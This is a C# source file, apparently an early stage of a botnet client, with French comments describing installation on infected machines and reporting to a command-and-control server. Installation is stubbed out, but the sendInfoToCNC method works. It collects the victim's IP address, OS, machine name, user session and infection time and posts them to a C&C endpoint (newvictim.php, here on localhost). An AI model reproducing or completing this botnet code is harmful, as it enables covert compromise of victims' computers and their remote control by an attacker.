using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Collections.Specialized;

namespace Botnet
{
    //Cette classe contiendra tout ce qu'il faut faut serveur au moment de l'infection: installation, envoie de données au C&C
    class Initialization
    {
        private static readonly HttpClient client = new HttpClient();

        public Initialization()
        {

        }

        public bool IsAlreadyInstalled()
        {

            return false;
        }

        public void Install()
        {
            //Générer un machine ID
        }

        public void sendInfoToCNC()
        {
            //Envoyer l'ip, le port, le nom de machine et autres infos essentielles pour pouvoir contrôler les victimes (via HTTP/s?)
            //Les informations sont récupérés au travers de d'un objet tools
            Tools info = new Tools();
            
            using (var client = new System.Net.WebClient())
            {
                var values = new NameValueCollection();
                values["ip"] = info.ip;
                values["port"] = "2107";
                values["os"] = info.os;
                values["machine_name"] = info.machine_name;
                values["user_session"] = info.user_session;
                values["infection_date"] = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss"); //format UTC 0 

                var response = client.UploadValues("http://127.0.0.1/botnet/newvictim.php", values);

                var responseString = Encoding.Default.GetString(response);
                Console.WriteLine(responseString);
            }
        }
    }
}
